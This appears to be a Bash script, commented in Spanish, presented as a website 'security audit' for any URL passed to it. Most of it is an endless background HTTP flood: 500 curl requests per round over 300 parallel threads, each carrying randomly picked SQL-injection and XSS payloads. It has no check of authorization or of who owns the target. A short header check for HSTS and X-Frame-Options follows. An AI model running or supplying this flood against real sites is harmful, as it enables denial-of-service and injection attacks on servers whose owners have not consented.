#!/bin/bash

TARGET_URL=$1

if [ -z "$TARGET_URL" ]; then
    echo "Error: Debes proporcionar una URL. Uso: ./scripts/security_audit.sh https://tuweb.com"
    exit 1
fi

echo "#################################################"
echo "#          SANTRIX SECURITY AUDIT REPORT        #"
echo "#################################################"
echo "Target: $TARGET_URL"
echo "Fecha: $(date)"
echo "-------------------------------------------------"

# 1. Prueba de estrés real (Ataque Híbrido: Flood + SQLi + XSS)
echo "[+] Iniciando ataque híbrido masivo (HTTP Flood + Payload Injection)..."
echo "[!] ADVERTENCIA: Esta prueba enviará miles de peticiones con payloads maliciosos."
echo "[!] Presiona Ctrl+C en la terminal para detener el ataque."

# Payloads básicos para inyección
SQLI_PAYLOADS=("' OR 1=1 --" "' OR '1'='1" "admin' --" "') OR ('1'='1")
XSS_PAYLOADS=("<script>alert(1)</script>" "\"><script>alert('XSS')</script>" "javascript:alert(1)")

# Inundación infinita con hilos extremos y parámetros de fuerza bruta
while true; do
    # Seleccionar payloads aleatorios
    SQL=${SQLI_PAYLOADS[$RANDOM % ${#SQLI_PAYLOADS[@]}]}
    XSS=${XSS_PAYLOADS[$RANDOM % ${#XSS_PAYLOADS[@]}]}
    
    # -P 300: 300 hilos simultáneos
    # Se añaden parámetros con payloads de SQLi y XSS en la URL para estresar el backend y los filtros
    seq 500 | xargs -n 1 -P 300 curl -s -L -k --connect-timeout 1 --max-time 2 \
        -A "SANTRIX-Hybrid-Agent-$(date +%s)" \
        -G --data-urlencode "user=$SQL" --data-urlencode "q=$XSS" \
        -o /dev/null -w "%{http_code}\n" "$TARGET_URL" >> /tmp/stress_results.txt
    
    # Análisis de salud
    FAIL_COUNT=$(tail -n 300 /tmp/stress_results.txt | grep -c -v "200")
    if [ "$FAIL_COUNT" -gt 250 ]; then
        echo "[!!!] ÉXITO: El servidor está saturado o bloqueando activamente el ataque híbrido."
    fi
done &
STRESS_PID=$!

echo "[*] Ataque continuo iniciado (PID: $STRESS_PID)."
echo "[*] Monitorizando... Para detenerlo usa el comando: kill $STRESS_PID"
wait $STRESS_PID


# 2. Análisis de fallos comunes
echo "-------------------------------------------------"
echo "[+] ANALIZANDO VULNERABILIDADES:"

# Verificar si el servidor responde
HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL")

if [ "$HTTP_STATUS" -eq 200 ]; then
    echo "[!] RESULTADO: El servidor NO bloqueó el ataque simulado."
    echo "[!] FALLO DETECTADO: Falta de Rate Limiting o WAF activo."
    echo "[i] RECOMENDACIÓN: Implementar Cloudflare o configurar mod_evasive/fail2ban."
else
    echo "[✓] RESULTADO: El servidor respondió con estado $HTTP_STATUS o no respondió."
    echo "[✓] ÉXITO: El servidor parece tener mecanismos de protección activos."
fi

# 3. Verificación de Cabeceras de Seguridad
echo "-------------------------------------------------"
echo "[+] REVISIÓN DE CABECERAS:"
HEADERS=$(curl -sI "$TARGET_URL")

if echo "$HEADERS" | grep -q "Strict-Transport-Security"; then
    echo "[✓] HSTS: Protegido"
else
    echo "[X] HSTS: Faltante (Riesgo de Man-in-the-Middle)"
fi

if echo "$HEADERS" | grep -q "X-Frame-Options"; then
    echo "[✓] Clickjacking: Protegido"
else
    echo "[X] X-Frame-Options: Faltante (Riesgo de Clickjacking)"
fi

echo "-------------------------------------------------"
echo "#           FIN DEL REPORTE SANTRIX             #"
echo "#################################################"
